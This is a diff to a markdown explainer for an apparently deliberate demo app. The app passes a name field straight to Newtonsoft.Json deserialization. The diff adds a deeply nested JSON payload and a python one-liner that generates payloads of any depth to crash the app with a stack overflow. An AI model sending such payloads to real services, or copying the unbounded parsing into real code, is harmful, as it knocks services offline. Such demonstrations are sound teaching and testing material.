@@ -16,22 +16,20 @@ Newtonsoft.Json's `JsonConvert.DeserializeObject()` method can be exploited by c
 
 ### How the exploit works
 
-The app has a simple JSON parsing endpoint:
+The app takes user input and parses it directly through Newtonsoft.Json (same pattern as the Maven demo's `yaml.load(name)`):
 
 ```csharp
-var parsed = JsonConvert.DeserializeObject<JToken>(json);
+var parsed = JsonConvert.DeserializeObject<JToken>(name);
 ```
 
-**Normal input:**
-```json
-{"name": "alice"}
-```
-Newtonsoft.Json parses this normally and returns the object.
+**Normal input:** Type `alice` → displays "Welcome, alice!"
 
-**Exploit — send deeply nested JSON:**
-```json
-{"nested":{"nested":{"nested":{"nested":{"nested":{"nested":{"nested":{"nested":...}}}}}}}}
+**Exploit — paste deeply nested JSON into the name field:**
 ```
+{"n":{"n":{"n":{"n":{"n":{"n":{"n":{"n":{"n":{"n":{"n":{"n":{"n":{"n":{"n":{"n":{"n":{"n":{"n":{"n":1}}}}}}}}}}}}}}}}}}}}
+```
+
+Generate a payload with any depth: `python3 -c "d=800; print('{\"n\":'*d + '1' + '}'*d)"`
 
 When the recursion depth exceeds the stack size, the application crashes with a `StackOverflowException`.
 
